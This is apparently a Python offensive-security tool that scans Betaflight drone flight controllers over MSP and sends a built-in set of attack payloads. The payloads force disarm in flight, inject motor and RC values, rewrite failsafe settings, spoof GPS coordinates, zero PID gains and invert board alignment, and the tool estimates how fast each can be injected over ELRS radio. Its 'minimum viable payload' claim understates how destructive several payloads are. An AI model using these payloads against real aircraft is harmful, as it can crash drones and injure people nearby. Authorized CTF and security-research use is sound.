#!/usr/bin/env python3
"""
MSP Vulnerability Scanner — enumerate dangerous MSP commands on an endpoint.

Probes a Betaflight MSP endpoint (SITL TCP or serial) to determine which
dangerous MSP commands are accepted, which have arming-state protection,
and which are exploitable via MSP-over-ELRS.

Based on the Betaflight 4.4.2 vulnerability audit (PR #34) which identified
the complete set of MSP commands reachable over the ELRS radio link.

Scan modes:
  1. identify   — Probe MSP_API_VERSION, FC_VARIANT, FC_VERSION, BOARD_INFO
  2. enumerate  — Test all dangerous MSP commands for acceptance
  3. classify   — Categorize commands by arming-state protection
  4. full       — All of the above plus ELRS encapsulation analysis

The scanner only sends read-only probes in identify mode. Enumerate and
classify modes send SET commands in dry-run (frame construction only) unless
--execute is passed. Even with --execute, the scanner uses the minimum
viable payload and reports results without persisting changes (no EEPROM
write is ever sent).

Requires: Python 3.10+

Usage:
    # Dry-run scan (offline, show all probes)
    python3 msp-vuln-scanner.py --mode full

    # Identify a SITL endpoint
    python3 msp-vuln-scanner.py --mode identify \\
        --target tcp:127.0.0.1:5760 --execute

    # Full scan with ELRS encapsulation analysis
    python3 msp-vuln-scanner.py --mode full --ota-version 3

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Sequence

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# MSP v1 protocol
# ---------------------------------------------------------------------------
MSP_HEADER = b"$M"
MSP_DIR_TO_FC = b"<"
MSP_DIR_FROM_FC = b">"
MSP_DIR_ERROR = b"!"


def msp_checksum(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
    return crc


def build_msp_command(cmd: int, payload: bytes = b"") -> bytes:
    body = bytes([len(payload), cmd]) + payload
    return MSP_HEADER + MSP_DIR_TO_FC + body + bytes([msp_checksum(body)])


def parse_msp_response(data: bytes) -> tuple[int, bytes, bool] | None:
    if len(data) < 6:
        return None
    if data[:2] != MSP_HEADER:
        return None
    is_error = data[2:3] == MSP_DIR_ERROR
    if not is_error and data[2:3] != MSP_DIR_FROM_FC:
        return None
    length = data[3]
    cmd = data[4]
    if len(data) < 5 + length + 1:
        return None
    payload = data[5:5 + length]
    expected = msp_checksum(data[3:5 + length])
    if expected != data[5 + length]:
        return None
    return (cmd, payload, is_error)


# ---------------------------------------------------------------------------
# ELRS OTA sizing
# ---------------------------------------------------------------------------
CRSF_FRAMETYPE_MSP_WRITE = 0x7C
CRSF_FRAMETYPE_MSP_REQ = 0x7A
CRSF_ADDRESS_FC = 0xC8
CRSF_ADDRESS_TX = 0xEA
ELRS_DATA_BYTES = 5


def crsf_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def elrs_packets_for_msp(cmd: int, payload: bytes) -> int:
    """Count ELRS DATA packets needed to deliver an MSP command."""
    msp_inner = bytes([0x00, 0x00, cmd, len(payload)]) + payload
    frame_payload = bytes([CRSF_ADDRESS_FC, CRSF_ADDRESS_TX]) + msp_inner
    frame_type = CRSF_FRAMETYPE_MSP_WRITE if payload else CRSF_FRAMETYPE_MSP_REQ
    frame_body = bytes([frame_type]) + frame_payload
    crsf_len = 2 + len(frame_body) + 1  # dest + len + body + crc

    usable = ELRS_DATA_BYTES - 1  # 1 byte for seq/continuation header
    return (crsf_len + usable - 1) // usable


# ---------------------------------------------------------------------------
# Command database (from PR #34 vulnerability audit)
# ---------------------------------------------------------------------------
class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class MspCommandInfo:
    code: int
    name: str
    severity: Severity
    has_armed_check: bool
    description: str
    impact: str
    payload_builder: bytes
    source_file: str
    source_line: str
    elrs_reachable: bool = True


def build_command_database() -> list[MspCommandInfo]:
    """Build the database of dangerous MSP commands from the audit."""
    cmds = []

    cmds.append(MspCommandInfo(
        code=251, name="MSP_SET_ARMING_DISABLED",
        severity=Severity.CRITICAL, has_armed_check=False,
        description="Force disarm — calls disarm() even while ARMED",
        impact="Immediate motor shutdown in flight",
        payload_builder=bytes([1, 0, 0, 0]),
        source_file="msp.c", source_line="3537-3566",
    ))

    cmds.append(MspCommandInfo(
        code=68, name="MSP_REBOOT",
        severity=Severity.CRITICAL, has_armed_check=False,
        description="Force flight controller reboot",
        impact="Instant loss of motor control, possible DFU entry",
        payload_builder=bytes([0]),
        source_file="msp.c", source_line="2283-2321",
    ))

    cmds.append(MspCommandInfo(
        code=214, name="MSP_SET_MOTOR",
        severity=Severity.CRITICAL, has_armed_check=False,
        description="Direct motor value injection via motor_disarmed[]",
        impact="Motor spin while disarmed, asymmetric values cause erratic behavior",
        payload_builder=struct.pack("<8H", 1000, 1000, 1000, 1000, 0, 0, 0, 0),
        source_file="msp.c", source_line="2845-2849",
    ))

    cmds.append(MspCommandInfo(
        code=76, name="MSP_SET_FAILSAFE_CONFIG",
        severity=Severity.HIGH, has_armed_check=False,
        description="Rewrite failsafe parameters (delay, procedure, throttle)",
        impact="Change failsafe to DROP with zero delay before jamming",
        payload_builder=bytes([0, 0]) + struct.pack("<H", 1000) + bytes([0]) + struct.pack("<H", 0) + bytes([0]),
        source_file="msp.c", source_line="3704-3711",
    ))

    cmds.append(MspCommandInfo(
        code=201, name="MSP_SET_RAW_GPS",
        severity=Severity.HIGH, has_armed_check=False,
        description="Overwrite GPS solution state",
        impact="GPS rescue redirected to attacker-chosen coordinates",
        payload_builder=bytes([1, 12]) + struct.pack("<i", 389500000) + struct.pack("<i", -770500000) + struct.pack("<HH", 100, 0),
        source_file="msp.c", source_line="3576-3584",
    ))

    cmds.append(MspCommandInfo(
        code=45, name="MSP_SET_RX_CONFIG",
        severity=Severity.HIGH, has_armed_check=False,
        description="Overwrite receiver config including ELRS UID",
        impact="Break ELRS link by changing serialrx_provider, or replace UID",
        payload_builder=bytes([0]) + struct.pack("<HHH", 1500, 1500, 885) + bytes([0]) + struct.pack("<HH", 1100, 1900) + bytes(7),
        source_file="msp.c", source_line="3619-3702",
    ))

    cmds.append(MspCommandInfo(
        code=200, name="MSP_SET_RAW_RC",
        severity=Severity.HIGH, has_armed_check=False,
        description="Direct RC channel injection bypassing receiver",
        impact="Override stick inputs, effect lasts until next valid RX packet",
        payload_builder=struct.pack("<8H", 1500, 1500, 1500, 1500, 1000, 1000, 1000, 1000),
        source_file="msp.c", source_line="rc channel handler",
    ))

    cmds.append(MspCommandInfo(
        code=0xCA, name="MSP_SET_FEATURE_CONFIG",
        severity=Severity.MEDIUM, has_armed_check=False,
        description="Replace entire feature bitmask",
        impact="Disable safety features (ANTI_GRAVITY, AIRMODE) on next reboot",
        payload_builder=struct.pack("<I", 0),
        source_file="msp.c", source_line="3586-3588",
    ))

    cmds.append(MspCommandInfo(
        code=0x92, name="MSP_SET_PID",
        severity=Severity.MEDIUM, has_armed_check=False,
        description="Overwrite PID gains",
        impact="Zero all gains -> loss of stabilization; extreme D -> oscillation",
        payload_builder=bytes(30),  # 10 PID triplets zeroed
        source_file="msp.c", source_line="2665-2672",
    ))

    cmds.append(MspCommandInfo(
        code=0x26, name="MSP_SET_BOARD_ALIGNMENT_CONFIG",
        severity=Severity.MEDIUM, has_armed_check=False,
        description="Change board alignment offsets",
        impact="Invert gyro reference (roll=1800) -> FC fights itself",
        payload_builder=struct.pack("<hhh", 1800, 0, 0),
        source_file="msp.c", source_line="3602",
    ))

    # ARMED-gated commands (less useful for OTA attack)
    cmds.append(MspCommandInfo(
        code=250, name="MSP_EEPROM_WRITE",
        severity=Severity.LOW, has_armed_check=True,
        description="Persist config to EEPROM",
        impact="Persists runtime config changes; requires disarmed state",
        payload_builder=b"",
        source_file="msp.c", source_line="ARMED-gated",
    ))

    return cmds


# ---------------------------------------------------------------------------
# Transport (reuses pattern from msp-injection-sim.py)
# ---------------------------------------------------------------------------
class Transport:
    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        raise NotImplementedError

    def close(self) -> None:
        pass


class TcpTransport(Transport):
    def __init__(self, host: str, port: int):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(5.0)
        self.sock.connect((host, port))
        print(f"  Connected to {host}:{port}", file=sys.stderr)

    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        self.sock.settimeout(timeout)
        self.sock.sendall(frame)
        try:
            return self.sock.recv(256) or None
        except socket.timeout:
            return None

    def close(self) -> None:
        self.sock.close()


class DryRunTransport(Transport):
    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        return None


def open_transport(target: str, execute: bool) -> Transport:
    if not execute:
        return DryRunTransport()
    if target.startswith("tcp:"):
        parts = target[4:].split(":")
        return TcpTransport(parts[0], int(parts[1]) if len(parts) > 1 else 5760)
    elif target.startswith("serial:"):
        parts = target[7:].split(":")
        try:
            import serial  # type: ignore[import-untyped]
        except ImportError:
            print("ERROR: pyserial required for serial targets", file=sys.stderr)
            sys.exit(1)
        raise NotImplementedError("Serial transport — use msp-injection-sim.py")
    else:
        print(f"ERROR: unknown target: {target}", file=sys.stderr)
        sys.exit(1)


# ---------------------------------------------------------------------------
# Scan modes
# ---------------------------------------------------------------------------
@dataclass
class ScanResult:
    endpoint_info: dict | None = None
    command_results: list[dict] = field(default_factory=list)
    summary: dict = field(default_factory=dict)


# Read-only identification commands
IDENTIFY_CMDS = [
    (1, "MSP_API_VERSION"),
    (2, "MSP_FC_VARIANT"),
    (3, "MSP_FC_VERSION"),
    (4, "MSP_BOARD_INFO"),
    (101, "MSP_STATUS"),
    (104, "MSP_MOTOR"),
    (105, "MSP_RC"),
    (110, "MSP_ANALOG"),
]


def scan_identify(transport: Transport, execute: bool) -> dict | None:
    """Probe endpoint identity with read-only MSP commands."""
    info: dict = {}

    for cmd, name in IDENTIFY_CMDS:
        frame = build_msp_command(cmd)
        if not execute:
            info[name] = {"status": "dry_run", "frame": frame.hex()}
            continue

        resp = transport.send_recv(frame)
        if resp is None:
            info[name] = {"status": "timeout"}
            continue

        parsed = parse_msp_response(resp)
        if parsed is None:
            info[name] = {"status": "parse_error", "raw": resp.hex()}
            continue

        resp_cmd, payload, is_error = parsed
        if is_error:
            info[name] = {"status": "error"}
            continue

        info[name] = {"status": "ok", "payload": payload.hex(), "len": len(payload)}

        # Decode known responses
        if cmd == 1 and len(payload) >= 3:
            info["api_version"] = f"{payload[1]}.{payload[2]}"
        elif cmd == 2 and len(payload) >= 4:
            info["fc_variant"] = payload[:4].decode("ascii", errors="replace")
        elif cmd == 3 and len(payload) >= 3:
            info["fc_version"] = f"{payload[0]}.{payload[1]}.{payload[2]}"
        elif cmd == 4 and len(payload) >= 4:
            info["board_id"] = payload[:4].decode("ascii", errors="replace")

    return info


def scan_enumerate(cmds: list[MspCommandInfo], transport: Transport,
                   execute: bool, ota_version: int | None) -> list[dict]:
    """Test each dangerous command and report acceptance."""
    results = []

    for cmd_info in cmds:
        frame = build_msp_command(cmd_info.code, cmd_info.payload_builder)
        elrs_pkts = elrs_packets_for_msp(cmd_info.code, cmd_info.payload_builder)
        inject_ms = elrs_pkts * (1000.0 / 150.0) if ota_version else None

        entry: dict = {
            "code": cmd_info.code,
            "name": cmd_info.name,
            "severity": cmd_info.severity.value,
            "has_armed_check": cmd_info.has_armed_check,
            "description": cmd_info.description,
            "impact": cmd_info.impact,
            "source": f"{cmd_info.source_file}:{cmd_info.source_line}",
            "payload_len": len(cmd_info.payload_builder),
            "frame_len": len(frame),
            "elrs_reachable": cmd_info.elrs_reachable,
        }

        if ota_version:
            entry["elrs_packets"] = elrs_pkts
            entry["inject_time_ms"] = round(inject_ms, 1) if inject_ms else None

        if not execute:
            entry["status"] = "dry_run"
            entry["frame_hex"] = frame.hex()
        else:
            resp = transport.send_recv(frame)
            if resp is None:
                entry["status"] = "timeout"
            else:
                parsed = parse_msp_response(resp)
                if parsed is None:
                    entry["status"] = "parse_error"
                else:
                    _, _, is_error = parsed
                    entry["status"] = "rejected" if is_error else "accepted"

        results.append(entry)

    return results


def build_summary(results: list[dict]) -> dict:
    """Summarize scan results."""
    total = len(results)
    by_severity = {}
    no_armed_check = 0
    elrs_reachable = 0
    accepted = 0

    for r in results:
        sev = r["severity"]
        by_severity[sev] = by_severity.get(sev, 0) + 1
        if not r["has_armed_check"]:
            no_armed_check += 1
        if r.get("elrs_reachable"):
            elrs_reachable += 1
        if r.get("status") == "accepted":
            accepted += 1

    return {
        "total_commands_scanned": total,
        "by_severity": by_severity,
        "no_armed_check": no_armed_check,
        "elrs_reachable": elrs_reachable,
        "accepted": accepted,
        "risk_assessment": (
            "CRITICAL — multiple unprotected commands reachable over ELRS OTA"
            if no_armed_check > 3
            else "HIGH — some unprotected commands reachable"
            if no_armed_check > 0
            else "LOW — all dangerous commands require arming state"
        ),
    }


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
def print_scan_results(scan: ScanResult, verbose: bool = False) -> None:
    print(f"\n{'='*70}")
    print("MSP Vulnerability Scan Results")
    print(f"{'='*70}")

    if scan.endpoint_info:
        info = scan.endpoint_info
        print(f"\n--- Endpoint Identity ---")
        if "fc_variant" in info:
            print(f"  FC variant:    {info['fc_variant']}")
        if "fc_version" in info:
            print(f"  FC version:    {info['fc_version']}")
        if "api_version" in info:
            print(f"  API version:   {info['api_version']}")
        if "board_id" in info:
            print(f"  Board ID:      {info['board_id']}")

    if scan.command_results:
        print(f"\n--- Dangerous Commands ({len(scan.command_results)}) ---\n")
        print(f"  {'Cmd':<6s} {'Name':<30s} {'Sev':<10s} {'Armed?':<7s} "
              f"{'ELRS':<6s} {'Pkts':>5s} {'Status':<10s}")
        print(f"  {'-'*6} {'-'*30} {'-'*10} {'-'*7} {'-'*6} {'-'*5} {'-'*10}")

        for r in scan.command_results:
            armed = "YES" if r["has_armed_check"] else "NO"
            elrs = "YES" if r.get("elrs_reachable") else "NO"
            pkts = str(r.get("elrs_packets", "-"))
            status = r.get("status", "?")
            sev = r["severity"]

            print(f"  {r['code']:<6d} {r['name']:<30s} {sev:<10s} {armed:<7s} "
                  f"{elrs:<6s} {pkts:>5s} {status:<10s}")

            if verbose:
                print(f"         {r['description']}")
                print(f"         Impact: {r['impact']}")
                if "inject_time_ms" in r and r["inject_time_ms"]:
                    print(f"         OTA inject: {r['inject_time_ms']} ms")
                print()

    if scan.summary:
        s = scan.summary
        print(f"\n--- Summary ---")
        print(f"  Commands scanned:    {s['total_commands_scanned']}")
        print(f"  No armed check:     {s['no_armed_check']}")
        print(f"  ELRS reachable:     {s['elrs_reachable']}")
        if s['accepted'] > 0:
            print(f"  Accepted (live):    {s['accepted']}")
        print(f"\n  Severity breakdown:")
        for sev, count in s["by_severity"].items():
            print(f"    {sev}: {count}")
        print(f"\n  Risk: {s['risk_assessment']}")

    print(f"\n{'='*70}")
    print("Source: Betaflight 4.4.2 static analysis (PR #34)")
    print(f"{'='*70}\n")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="MSP Vulnerability Scanner — enumerate dangerous MSP commands",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )
    parser.add_argument("--mode", default="full",
                        choices=["identify", "enumerate", "classify", "full"],
                        help="Scan mode (default: full)")
    parser.add_argument("--target", default="tcp:127.0.0.1:5760",
                        help="MSP endpoint (default: tcp:127.0.0.1:5760)")
    parser.add_argument("--execute", action="store_true",
                        help="Connect and send probes (default: dry-run)")
    parser.add_argument("--ota-version", type=int, default=3, choices=[3, 4],
                        help="ELRS OTA version for packet size analysis (default: 3)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Show detailed command descriptions")

    args = parser.parse_args()

    transport = open_transport(args.target, args.execute)
    cmds = build_command_database()
    scan = ScanResult()

    try:
        if args.mode in ("identify", "full"):
            print("Scanning endpoint identity...", file=sys.stderr)
            scan.endpoint_info = scan_identify(transport, args.execute)

        if args.mode in ("enumerate", "classify", "full"):
            print(f"Enumerating {len(cmds)} dangerous commands...", file=sys.stderr)
            scan.command_results = scan_enumerate(
                cmds, transport, args.execute, args.ota_version)
            scan.summary = build_summary(scan.command_results)

        print_scan_results(scan, args.verbose)

    finally:
        transport.close()


if __name__ == "__main__":
    main()
